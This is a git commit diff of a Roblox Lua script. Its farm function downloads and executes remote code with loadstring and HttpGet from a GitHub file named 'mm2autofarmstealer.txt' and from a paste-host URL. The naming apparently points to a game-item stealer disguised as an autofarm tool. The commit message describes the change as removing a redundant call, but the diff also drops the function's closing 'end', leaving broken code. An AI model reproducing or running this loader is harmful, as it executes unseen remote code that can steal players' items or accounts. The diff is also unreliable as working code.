6ba7d5c8b49a2acd886ab7db29be48d4b51c8bf4
Johnnyissocoollol <progackerroblox@gmail.com>
2026-06-30 12:16:16 -0500

    Remove redundant loadstring call in farm function

--- maybe.lua
+++ maybe.lua
@@ -1,6 +1,4 @@
 local function farm()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Johnnyissocoollol/Mm2New/refs/heads/main/mm2autofarmstealer.txt", true))()
-    loadstring(game:HttpGet("loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/kNCVmh2opIvfBC8O/raw",true))()", true))()
-end
-
+    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/kNCVmh2opIvfBC8O/raw", true))()
 farm()
